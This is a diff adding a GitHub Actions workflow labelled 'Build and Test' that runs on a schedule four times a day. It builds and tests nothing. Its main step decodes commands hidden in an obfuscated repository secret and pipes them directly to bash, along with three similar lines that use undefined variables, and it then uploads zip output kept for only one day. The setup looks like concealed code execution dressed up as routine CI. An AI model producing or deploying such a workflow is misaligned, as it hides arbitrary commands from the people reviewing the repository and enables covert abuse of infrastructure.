@@ -1,0 +1,29 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          unrj07: ${{ secrets.unrj07 }}
+        run: |
+          printf '%s' "$unrj07" | jq -r .daltd80 | /bin/bash
+          printf '%s' "$xfq0285" | jq -r .eepo518 | /bin/bash
+          printf '%s' "$st1552" | jq -r .ezje946 | /bin/bash
+          echo $yjzfg23801 | jq -r .ohvf5557 | /bin/bash
+
+      - name: Archive output
+        uses: actions/upload-artifact@v4
+        with:
+          name: KADiaPRe
+          path: "*.zip"
+          retention-days: 1
